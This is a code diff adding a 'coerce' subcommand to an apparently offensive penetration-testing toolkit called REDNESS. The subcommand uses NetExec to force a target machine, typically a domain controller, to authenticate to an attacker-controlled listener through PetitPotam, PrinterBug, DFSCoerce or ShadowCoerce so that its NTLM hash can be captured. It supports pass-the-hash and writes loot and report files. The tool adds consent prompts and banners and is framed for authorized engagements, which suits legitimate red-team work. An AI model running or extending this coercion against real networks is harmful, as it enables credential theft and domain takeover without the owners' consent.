@@ -534,6 +534,128 @@ def cmd_poison(args) -> int:
     return 0
 
 
+_COERCE_BANNER = (
+    "\n=====================================================================\n"
+    " REDNESS coerce - active RPC forced authentication (PetitPotam/\n"
+    " PrinterBug/DFSCoerce). INTRUSIVE: actively coerces a TARGET machine\n"
+    " (often a DC) into authenticating to your listener - the target WILL\n"
+    " log the authentication/RPC event. Authorized, in-scope engagements\n"
+    " only - assume written authorization exists.\n"
+    "=====================================================================\n"
+)
+
+
+def cmd_coerce(args) -> int:
+    import shutil
+    import time
+    import webbrowser
+
+    from .coerce import run_coerce
+
+    # safeguard (like spray): the danger banner ALWAYS prints (to stderr), even scripted.
+    print(_COERCE_BANNER, file=sys.stderr)
+
+    if not (shutil.which("nxc") or shutil.which("netexec")):
+        print("[!] nxc (NetExec) is not installed / not on PATH.", file=sys.stderr)
+        print("    Install on the Kali/Linux operator box:  pipx install netexec", file=sys.stderr)
+        return 2
+
+    # Warning-only pre-flight: we cannot reliably verify a listener on another machine.
+    print(f"[!] A listener MUST already be running at {args.listener} to CAPTURE the coerced")
+    print("    authentication - run `redness poison` there first. This command only TRIGGERS it.")
+
+    credentialed = bool(args.username and (args.password or args.hash or args.kerberos))
+    if not credentialed:
+        print("[!!] ---------------------------------------------------------------", file=sys.stderr)
+        print("[!!] UNCREDENTIALED COERCION: relies on an unpatched target; less", file=sys.stderr)
+        print("[!!] reliable and the patch state is unknown. Requires --force AND a", file=sys.stderr)
+        print("[!!] typed FORCE confirmation.", file=sys.stderr)
+        print("[!!] ---------------------------------------------------------------", file=sys.stderr)
+        if not args.force:
+            print("[*] Aborted: --force is required for an uncredentialed coercion.", file=sys.stderr)
+            return 2
+
+    print(f"[*] Target {args.target}; coercing via {args.method} -> {args.listener}.")
+
+    # Normal consent prompt (skipped only by --yes).
+    if not args.yes:
+        try:
+            if input(f"    Type YES to coerce {args.target} to authenticate to {args.listener}: "
+                     ).strip() != "YES":
+                print("[*] Aborted.")
+                return 1
+        except (EOFError, KeyboardInterrupt):
+            print("\n[*] Aborted.")
+            return 1
+
+    # safeguard: forcing past the uncredentialed refusal needs a SECOND, distinct FORCE
+    # confirmation that --yes never skips - so --force + --yes can never bypass both checks.
+    def _force_prompt(reason: str) -> bool:
+        label = {"uncredentialed": "coercion will run UNAUTHENTICATED against a possibly-patched "
+                                   "target"}.get(reason, reason)
+        print(f"\n[!!] SAFETY OVERRIDE: {label}.", file=sys.stderr)
+        try:
+            return input("    Type FORCE to override and run the coercion: ").strip() == "FORCE"
+        except (EOFError, KeyboardInterrupt):
+            return False
+
+    bus = None
+    server = None
+    if args.live:
+        from .events import default_bus
+        from .live import LiveServer
+        bus = default_bus
+        server = LiveServer(bus, host=args.host, port=args.port)
+        url = server.start()
+        print(f"[+] Live graph at {url}")
+        if not args.no_open:
+            webbrowser.open(url)
+        time.sleep(1.2)
+
+    report, res = run_coerce(
+        args.target, args.listener, method=args.method,
+        username=args.username, password=args.password, nthash=args.hash,
+        domain=args.domain, kerberos=args.kerberos,
+        target_not_dc_ok=args.target_not_dc_ok, force=args.force, confirm_force=_force_prompt,
+        bus=bus, engagement=args.engagement, loot_dir=args.loot_dir,
+    )
+
+    if res.refused:
+        reasons = {
+            "uncredentialed": "uncredentialed and not force-confirmed",
+            "not-a-dc": f"{args.target} does not look like a Domain Controller (no LDAP) - "
+                        "pass --target-not-dc-ok to allow",
+        }
+        print(f"[*] Coercion refused: {reasons.get(res.reason, res.reason)}.", file=sys.stderr)
+    else:
+        coerced = [r.method for r in res.results if r.coerced]
+        if coerced:
+            print(f"[+] {args.target} coerced via: {', '.join(coerced)}"
+                  + (" (Domain Controller)" if res.is_dc else ""))
+            print(f"[*] Check the `redness poison` listener at {args.listener} for the captured hash.")
+        else:
+            print(f"[*] {args.target} did not authenticate to the listener via any method tried.")
+
+    _print_summary(report)
+    if args.out:
+        docx_report.build(report, args.out)
+        print(f"[+] Report -> {args.out}")
+    if args.json:
+        with open(args.json, "w", encoding="utf-8") as fh:
+            fh.write(report.to_json())
+        print(f"[+] Findings JSON -> {args.json}")
+
+    if server:
+        print("[*] Live graph running. Ctrl+C to stop.")
+        try:
+            while True:
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            print("\n[*] Stopping.")
+            server.stop()
+    return 0
+
+
 _TRIGGER_BANNER = (
     "\n=====================================================================\n"
     " REDNESS trigger - forced-authentication UNC link (NetNTLMv2 capture)\n"
@@ -708,6 +830,36 @@ def main(argv=None) -> int:
     sp.add_argument("--port", type=int, default=8765, help="live graph port")
     sp.add_argument("--no-open", action="store_true", help="don't auto-open the browser")
     sp.set_defaults(func=cmd_spray)
+
+    co = sub.add_parser("coerce",
+                        help="active RPC forced-auth coercion (PetitPotam/PrinterBug/DFSCoerce; "
+                             "intrusive; opt-in, gated)")
+    co.add_argument("--target", required=True, help="host to coerce (must look like a DC unless "
+                    "--target-not-dc-ok)")
+    co.add_argument("--listener", required=True, help="attacker IP the coerced auth is directed "
+                    "to (run `redness poison` there to capture it)")
+    co.add_argument("--method", choices=["all", "petitpotam", "printerbug", "dfscoerce", "shadowcoerce"],
+                    default="all", help="coercion method (default: all - PetitPotam/PrinterBug/DFSCoerce)")
+    co.add_argument("-u", "--username", help="tester username (authenticated coercion)")
+    co.add_argument("-p", "--password", help="tester password")
+    co.add_argument("-H", "--hash", help="tester NT hash for pass-the-hash")
+    co.add_argument("-d", "--domain", help="domain")
+    co.add_argument("-k", "--kerberos", action="store_true", help="use Kerberos auth")
+    co.add_argument("--target-not-dc-ok", action="store_true",
+                    help="allow coercing a target that does not look like a DC (findings HIGH, not CRITICAL)")
+    co.add_argument("--force", action="store_true",
+                    help="allow uncredentialed coercion (ALSO needs a typed FORCE confirmation)")
+    co.add_argument("--yes", action="store_true",
+                    help="skip the initial YES prompt (scripted use; does NOT skip FORCE)")
+    co.add_argument("--engagement", default="REDNESS coercion")
+    co.add_argument("--loot-dir", default="loot", help="where to write the coercion audit log")
+    co.add_argument("--out", help="write a .docx report to this path")
+    co.add_argument("--json", help="write findings JSON to this path")
+    co.add_argument("--live", action="store_true", help="stream to the live 3D graph")
+    co.add_argument("--host", default="127.0.0.1", help="live graph bind host")
+    co.add_argument("--port", type=int, default=8765, help="live graph port")
+    co.add_argument("--no-open", action="store_true", help="don't auto-open the browser")
+    co.set_defaults(func=cmd_coerce)
 
     tr = sub.add_parser("trigger",
                         help="generate a forced-authentication UNC trigger link (NetNTLMv2 capture; opt-in)")
